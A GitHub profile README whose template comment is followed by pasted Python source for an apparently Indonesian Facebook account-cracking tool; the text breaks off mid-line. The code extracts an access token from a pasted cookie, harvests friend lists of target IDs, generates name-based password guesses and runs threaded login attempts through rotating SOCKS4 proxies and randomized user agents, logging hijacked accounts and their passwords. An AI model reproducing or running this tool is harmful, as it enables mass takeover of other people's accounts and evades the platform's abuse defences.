### Hi there 👋

<!--
**Erenhub/ERENHUB** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
# -*- coding:utf8 -*- 
  
 #-----------------[ IMPORT-MODULE ]------------------- 
 import requests,bs4,json,os,sys,random,datetime,time,re 
 import urllib3,rich,base64 
 from rich.table import Table as me 
 from rich.console import Console as sol 
 from bs4 import BeautifulSoup as sop 
 from concurrent.futures import ThreadPoolExecutor as tred 
 from rich.console import Group as gp 
 from rich.panel import Panel as nel 
 from rich import print as cetak 
 from rich.markdown import Markdown as mark 
 from rich.columns import Columns as col 
 from rich import print as rprint 
 from rich import pretty 
 from rich.text import Text as tekz 
 pretty.install() 
 CON=sol() 
 #------------------[ USER-AGENT ]-------------------# 
 ugen2=[] 
 ugen=[] 
 cokbrut=[] 
 ses=requests.Session() 
 princp=[] 
 try: 
         prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text 
         open('.prox.txt','w').write(prox) 
 except Exception as e: 
         print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mEREN') 
 prox=open('.prox.txt','r').read().splitlines() 
 for xd in range(10000): 
         a='Mozilla/5.0 (Symbian/3; Series60/' 
         b=random.randrange(1, 9) 
         c=random.randrange(1, 9) 
         d='Nokia' 
         e=random.randrange(100, 9999) 
         f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/' 
         g=random.randrange(1, 9) 
         h=random.randrange(1, 4) 
         i=random.randrange(1, 4) 
         j=random.randrange(1, 4) 
         k='Mobile Safari/535.1' 
         uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}') 
         ugen2.append(uaku) 
  
  
         aa='Mozilla/5.0 (Linux; U; Android' 
         b=random.choice(['6','7','8','9','10','11','12']) 
         c=' en-us; GT-' 
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         e=random.randrange(1, 999) 
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' 
         h=random.randrange(73,100) 
         i='0' 
         j=random.randrange(4200,4900) 
         k=random.randrange(40,150) 
         l='Mobile Safari/537.36' 
         uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}' 
         ugen.append(uaku2) 
 for x in range(10): 
         a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S' 
         b=random.randrange(100, 9999) 
         c=random.randrange(100, 9999) 
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
         h=random.randrange(1, 9) 
         i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/' 
         j=random.randrange(1, 9) 
         k=random.randrange(1, 9) 
         l='Mobile WVGA SMM-MMS/1.2.0 OPN-B' 
         uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}' 
 def uaku(): 
         try: 
                 ua=open('bbnew.txt','r').read().splitlines() 
                 for ub in ua: 
                         ugen.append(ub) 
         except: 
                 a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text 
                 ua=open('.bbnew.txt','w') 
                 aa=re.findall('line">(.*?)<',str(a)) 
                 for un in aa: 
                         ua.write(un+'\n') 
                 ua=open('.bbnew.txt','r').read().splitlines() 
 #------------[ INDICATION ]---------------# 
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[] 
 cokbrut=[] 
 pwpluss,pwnya=[],[] 
 #------------[ WARNA-COLOR ]--------------# 
 P = '\x1b[1;97m' 
 M = '\x1b[1;91m' 
 H = '\x1b[1;92m' 
 K = '\x1b[1;93m' 
 B = '\x1b[1;94m' 
 U = '\x1b[1;95m'  
 O = '\x1b[1;96m' 
 N = '\x1b[0m'     
 Z = "\033[1;30m" 
 sir = '\033[41m\x1b[1;97m' 
 x = '\33[m' # DEFAULT 
 m = '\x1b[1;91m' #RED + 
 k = '\033[93m' # KUNING + 
 h = '\x1b[1;92m' # HIJAU + 
 hh = '\033[32m' # HIJAU - 
 u = '\033[95m' # UNGU 
 kk = '\033[33m' # KUNING - 
 b = '\33[1;96m' # BIRU - 
 p = '\x1b[0;34m' # BIRU + 
 asu = random.choice([m,k,h,u,b]) 
 #--------------------[ CONVERTER-BULAN ]--------------# 
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'} 
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'} 
 tgl = datetime.datetime.now().day 
 bln = dic[(str(datetime.datetime.now().month))] 
 thn = datetime.datetime.now().year 
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
 #------------------[ MACHINE-SUPPORT ]---------------# 
 def alvino_xy(u): 
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005) 
 def clear(): 
         os.system('clear') 
 def back(): 
         login() 
          
 #------------------[ LOGO-LAKNAT ]-----------------# 
 def banner(): 
         clear() 
         ban=''' 
          
 █▀█ █▀█ █░█ █▀▄▀█ █▀█ █▀▄ █▀▀ █▀▄ ▄█ ▀█▀ ▀█ 
 █▀▀ █▀▄ ▀▀█ █░▀░█ █▄█ █▄▀ ██▄ █▄▀ ░█ ░█░ █▄ 
  
         cetak(nel(ban, style='white')) 
                ''' 
 #--------------------[ BAGIAN-MASUK ]--------------# 
 def login(): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
                 tokenku.append(token) 
                 try: 
                         sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok}) 
                         sy2 = json.loads(sy.text)['name'] 
                         sy3 = json.loads(sy.text)['id'] 
                         menu(sy2,sy3) 
                 except KeyError: 
                         login_lagi334() 
                 except requests.exceptions.ConnectionError: 
                         li = '# CHECK INTERNET CONNECTION, CHECK AND TRY AGAIN' 
                         lo = mark(li, style='red') 
                         sol().print(lo, style='purple') 
                         exit() 
         except IOError: 
                 login_lagi334() 
 def login_lagi334(): 
         try: 
                 os.system('clear') 
                 banner() 
                 asu = random.choice([m,k,h,b,u]) 
                 cookie=input(f'  [{h}•{u}] INPUT COOKIES :{asu} ') 
                 data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})  
                 find_token = re.search("(EAAG\w+)", data.text) 
                 ken=open(".token.txt", "w").write(find_token.group(1)) 
                 cok=open(".cok.txt", "w").write(cookie) 
                 print(f'  {u}[{h}PR4MODED1TZ{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1) 
                 exit() 
         except Exception as e: 
                 os.system("rm -f .token.txt") 
                 os.system("rm -f .cok.txt") 
                 print(f'  %s[%sx%s]%s LOGIN ERROR....TRY AGAIN !!%s'%(x,k,x,m,x)) 
                 exit() 
 #------------------[ BAGIAN-MENU ]----------------# 
 def menu(my_name,my_id): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
         except IOError: 
                 print('[×] INVIALD COOKIE ') 
                 time.sleep(5) 
                 login_lagi334() 
         os.system('clear') 
         banner() 
         ip = requests.get("https://api.ipify.org").text 
         alvino_xy(f'{u} ID : '+str(my_id)) 
         alvino_xy(f'{h} IP : {ip}') 
         print('') 
         cetak('[bold green] 1. PUBLIC CLONING\n 2. FILE CLONING\n 3. CHECK RESULTS\n 0. EXIT [bold green]') 
         _____cowok__pink_____ = input('\n CHOOSE : ') 
         if _____cowok__pink_____ in ['1']: 
                 dump_massal() 
         elif _____cowok__pink_____ in ['2']: 
                 crack_file() 
         elif _____cowok__pink_____ in ['3','03']: 
                 result() 
         elif _____cowok__pink_____ in ['0']: 
                 os.system('rm -rf .token.txt') 
                 os.system('rm -rf .cookie.txt') 
                 print('#DONE LOGOUT ') 
                 exit() 
         else: 
                 print('# SELECT CORRECTLY ') 
                 back() 
 def error(): 
         print(f'{k}#TRY AGAIN {u}') 
         time.sleep(4) 
         back() 
          
         #-----------------[ HASIL-CRACK ]-----------------# 
 def result(): 
         os.system('clear') 
         banner() 
         print(' 1. CP ACCOUNT ') 
         print(' 2. OK ACCOUNT') 
         print(' 0. EXIT        ') 
         kz = input('\n• Choose : ') 
         if kz in ['1','01']: 
                 try:vin = os.listdir('CP') 
                 except FileNotFoundError: 
                         print('• File Not Found') 
                         time.sleep(3) 
                         back() 
                 if len(vin)==0: 
                         print('• You Have No CP Results ') 
                         time.sleep(2) 
                         back() 
                 else: 
                         cih = 0 
                         lol = {} 
                         for isi in vin: 
                                 try:hem = open('CP/'+isi,'r').readlines() 
                                 except:continue 
                                 cih+=1 
                                 if cih<10: 
                                         nom = '0'+str(cih) 
                                         lol.update({str(cih):str(isi)}) 
                                         lol.update({nom:str(isi)}) 
                                         print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                                 else: 
                                         lol.update({str(cih):str(isi)}) 
                                         print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                         geeh = input('\n   Choose : ') 
                         try:geh = lol[geeh] 
                         except KeyError: 
                                 print('• CHOOSE RIGHT OPTION ') 
                                 exit() 
                         try:lin = open('CP/'+geh,'r').read().splitlines() 
                         except: 
                                 print('• FILE NOT FOUND ') 
                                 time.sleep(2) 
                                 back() 
                         nocp=0 
                         for cpku in range(len(lin)): 
                                 cpkuni=lin[nocp].split('|') 
                                 cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}' 
                                 sol().print(cpkuh,style="yellow") 
                                 nocp +=1 
                         input('[ Click Enter ]') 
                         back() 
         elif kz in ['2','02']: 
                 try:vin = os.listdir('OK') 
                 except FileNotFoundError: 
                         print('• File Not Found ') 
                         time.sleep(2) 
                         back() 
                 if len(vin)==0: 
                         print('• No OK FILE HERE ') 
                         time.sleep(2) 
                         back() 
                 else: 
                         cih = 0 
                         lol = {} 
                         for isi in vin: 
                                 try:hem = open('OK/'+isi,'r').readlines() 
                                 except:continue 
                                 cih+=1 
                                 if cih<100: 
                                         nom = ''+str(cih) 
                                         lol.update({str(cih):str(isi)}) 
                                         lol.update({nom:str(isi)}) 
                                         print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                                 else: 
                                         lol.update({str(cih):str(isi)}) 
                                         print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u) 
                         geeh = input('\n• CHOOSE : ') 
                         try:geh = lol[geeh] 
                         except KeyError: 
                                 print('• SELECT RIGHT OPTION ') 
                                 exit() 
                         try:lin = open('OK/'+geh,'r').read().splitlines() 
                         except: 
                                 print('• File Not Found ') 
                                 time.sleep(2) 
                                 back() 
                         nocp=0 
                         for cpku in range(len(lin)): 
                                 cpkuni=lin[nocp].split('|') 
                                 cpkuh=f' {cpkuni[0]}  {cpkuni[1]}' 
                                 sol().print(cpkuh,style="green") 
                                 nocp +=1 
                         input('[ CLICK ENTER 2 BACK ]') 
                         back() 
         elif kz in ['0','00']: 
                 back() 
         else: 
                 print('• SELECT RIGHT OPTION ') 
                 exit() 
 #-------------------[ CRACK-PUBLIK ]----------------# 
 def dump_massal(): 
         try: 
                 token = open('.token.txt','r').read() 
                 cok = open('.cok.txt','r').read() 
         except IOError: 
                 exit() 
         try: 
                 jum = int(input('• ENTER THE NUMBERS OF IDZ YOU WANT TO CLONE  : ')) 
         except ValueError: 
                 print(' INVALID OPTION ') 
                 exit() 
         if jum<1 or jum>100000000: 
                 print('#TRY AGAIN ') 
                 exit() 
         ses=requests.Session() 
         yz = 0 
         for met in range(jum): 
                 yz+=1 
                 kl = input('• INPUT ID '+str(yz)+' : ') 
                 uid.append(kl) 
         for userr in uid: 
                 try: 
                         col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json() 
                         for mi in col['friends']['data']: 
                                 try: 
                                         iso = (mi['id']+'|'+mi['name']) 
                                         if iso in id:pass 
                                         else:id.append(iso) 
                                 except:continue 
                 except (KeyError,IOError): 
                         pass 
                 except requests.exceptions.ConnectionError: 
                         print('#TRY AGAIN ') 
                         os.system('clear') 
         try: 
                 print('') 
                 print(f'{P}#TOTAL ID={b}'+str(len(id))) 
                 print('') 
                 setting() 
         except requests.exceptions.ConnectionError: 
                 print(f'{u}') 
                 back() 
         except (KeyError,IOError): 
                 print(f'#{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK {u}') 
                 time.sleep(3) 
                 back() 
                  
                  
 def cek_apk(session,coki): 
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text 
     sop = BeautifulSoup(w,"html.parser") 
     x = sop.find("form",method="post") 
     game = [i.text for i in x.find_all("h3")] 
     if len(game)==0: 
         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N)) 
     else: 
         print(f'\r 🎮  %sYour Active Application Details :'%(H)) 
         for i in range(len(game)): 
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N)) 
         #else: 
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N)) 
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text 
     sop = BeautifulSoup(w,"html.parser") 
     x = sop.find("form",method="post") 
     game = [i.text for i in x.find_all("h3")] 
     if len(game)==0: 
         print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N)) 
     else: 
         print(f'\r 🎮  %sYour Expired Application Details :'%(M)) 
         for i in range(len(game)): 
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N)) 
         else: 
             print(f'\r') 
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N)) 
 #-------------[ CRACK-FROM-FILE ]------------------# 
 def crack_file(): 
         o = input('FILE NAME : ') 
         print('') 
         try:lin = open(o).read().splitlines() 
         except: 
                 print('• File Not Found') 
                 time.sleep(2) 
                 back() 
         for xid in lin: 
                 id.append(xid) 
         setting() 
          
          
 #-------------[ PENGATURAN-IDZ ]---------------# 
 def setting(): 
         cetak('\t[bold cyan]CLONING MENU') 
         cetak('[bold white]1. CLONE JUST OLD IDZ \n2. CLONE JUST NEW IDZ\n3. CLONE MIX IDZ (NEW/OLD)BEST [bold yellow]') 
         print('') 
         hu = input(' CHOOSE : ') 
         print('') 
         if hu in ['1','01']: 
                 for tua in sorted(id): 
                         id2.append(tua) 
  
         elif hu in ['2','02']: 
                 muda=[] 
                 for bacot in sorted(id): 
                         muda.append(bacot) 
                 bcm=len(muda) 
                 bcmi=(bcm-1) 
                 for xmud in range(bcm): 
                         id2.append(muda[bcmi]) 
                         bcmi -=1 
         elif hu in ['3','03']: 
                 for bacot in id: 
                         xx = random.randint(0,len(id2)) 
                         id2.insert(xx,bacot) 
         else: 
                 print('#TRY AGAIN') 
                 exit() 
         cetak('\t[bold green]LOGIN METHOD') 
         cetak('[bold white]1. METHOD 1\n2. METHOD 2 [bold purple]') 
         print('') 
         hc = input(' CHOOSE : ') 
         if hc in ['1','01']: 
                 method.append('mobile') 
 #        elif hc in ['2','02']: 
 #                method.append('free') 
 #        elif hc in ['3','03']: 
 #                method.append('touch') 
         elif hc in ['4','04']: 
                 method.append('mbasic') 
         else: 
                 method.append('mobile') 
         pwplus=input('• TRY DEAFULT PASSWORD[M/D] ') 
         if pwplus in ['y','Y']: 
                 pwpluss.append('ya') 
                 cetak(nel('[[purple]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]•[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] ')) 
                 pwku=input('#Add PASSWORDS : ') 
                 pwkuh=pwku.split(',') 
                 for xpw in pwkuh: 
                         pwnya.append(xpw) 
         else: 
                 pwpluss.append('no') 
         passwrd() 
         exit()  
 #-------------------[ BAGIAN-WORDLIST ]------------# 
 def passwrd(): 
         os.system('clear') 
         banner() 
         print('') 
         alvino_xy(f'{x}----------------------------------------------------------------') 
         print("\x1b[1;97mTURN ON/OFF FLIGHT MODE IF NO RESULT SEEN\033[1;37m") 
         print('\x1b[1;97mTOTAL IDz : '+str(len(id))) 
         print("\x1b[1;97mPROCESS HAS BEEN STARTED") 
         alvino_xy(f'{x}----------------------------------------------------------------') 
         print('') 
         with tred(max_workers=30) as pool: 
                 for yuzong in id2: 
                         idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower() 
                         frs = nmf.split(' ')[0] 
                         pwv = [] 
                         if len(nmf)<6: 
                                 if len(frs)<3: 
                                         pass 
                                 else: 
                                         pwv.append(frs+'123') 
                                         pwv.append(frs+'1234') 
                                         pwv.append(frs+'12345') 
                                         pwv.append(frs+'123456') 
                                         pwv.append(frs+'1122') 
                                         pwv.append(frs+'1111') 
                         else: 
                                 if len(frs)<3: 
                                         pwv.append(nmf) 
                                 else: 
                                         pwv.append(nmf) 
                                         pwv.append(frs+'123') 
                                         pwv.append(frs+'1234') 
                                         pwv.append(frs+'12345') 
                                         pwv.append(frs+'123456') 
                                         pwv.append(frs+'1122') 
                                         pwv.append(frs+'1111') 
                         if 'ya' in pwpluss: 
                                 for xpwd in pwnya: 
                                         pwv.append(xpwd) 
                         else:pass 
                         if 'mobile' in method: 
                                 pool.submit(crack,idf,pwv) 
                         elif 'free' in method: 
                                 pool.submit(crackfree,idf,pwv) 
                         elif 'touch' in method: 
                                 pool.submit(cracktouch,idf,pwv) 
                         elif 'mbasic' in method: 
                                 pool.submit(crackmbasic,idf,pwv) 
                         else: 
                                 pool.submit(crackmbasic,idf,pwv) 
         print('') 
         cetak('\t[purple]#[green] CLONING COMPLETE[purple] <<[yellow] ') 
         print(f'[{h}•{u}]{h} OK : {h}%s '%(ok)) 
         print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp)) 
         print('') 
         woi = input(' : ') 
         if woi in ['y','Y']: 
                 back() 
         else: 
                 print(f'\t{x}{k} PRESS ENTER TO BACK {u} ') 
                 time.sleep(2) 
                 exit() 
                  
                  
 def cek_apk(session,coki): 
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text 
     sop = BeautifulSoup(w,"html.parser") 
     x = sop.find("form",method="post") 
     game = [i.text for i in x.find_all("h3")] 
     if len(game)==0: 
         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N)) 
     else: 
         print(f'\r 🎮  %sYour Active Application Details :'%(H)) 
         for i in range(len(game)): 
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N)) 
         #else: 
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N)) 
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text 
     sop = BeautifulSoup(w,"html.parser") 
     x = sop.find("form",method="post") 
     game = [i.text for i in x.find_all("h3")] 
     if len(game)==0: 
         print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N)) 
     else: 
         print(f'\r 🎮  %sYour Expired Application Details :'%(M)) 
         for i in range(len(game)): 
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N)) 
         else: 
             print(f'\r') 
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N)) 
 #--------------------[ METODE-B-API ]-----------------# 
 def crack(idf,pwv): 
         global loop,ok,cp 
         bo = random.choice([m,k,h,b,u,x]) 
         sys.stdout.write(f"\r{P}[EREN]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "), 
         sys.stdout.flush() 
         ua = random.choice(ugen) 
         ua2 = random.choice(ugen2) 
         ses = requests.Session() 
         for pw in pwv: 
                 try: 
                         nip=random.choice(prox) 
                         proxs= {'http': 'socks4://'+nip} 
                         ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}) 
                         p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr') 
                         dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,} 
                         koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]) 
                         koki+=' m_pixel_ratio=2.625; wd=412x756' 
                         heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"} 
                         po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs) 
                         if "checkpoint" in po.cookies.get_dict().keys(): 
                                 print(f'\r{K}[EREN-CP] {idf}  {pw} {N}')      
                                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                                 akun.append(idf+'|'+pw) 
                                 cp+=1 
                                 break 
                         elif "c_user" in ses.cookies.get_dict().keys(): 
                                 ok+=1 
                                 coki=po.cookies.get_dict() 
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                 print(f'\r{H}[EREN-OK] {idf}  {pw}') 
                                 open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n') 
                                 cek_apk(session,coki) 
                                 break 
                                  
                         else: 
                                 continue 
                 except requests.exceptions.ConnectionError: 
                         time.sleep(31) 
         loop+=1 
 #------------------[ METHODE-MBASIC-2 ]-------------------# 
 def crackfree(idf,pwv): 
         global loop,ok,cp 
         sys.stdout.write(f"\r# {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "), 
         sys.stdout.flush() 
         ua = random.choice(ugen) 
         ua2 = random.choice(ugen2) 
         ses = requests.Session() 
         for pw in pwv: 
                 try: 
                         ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,ima
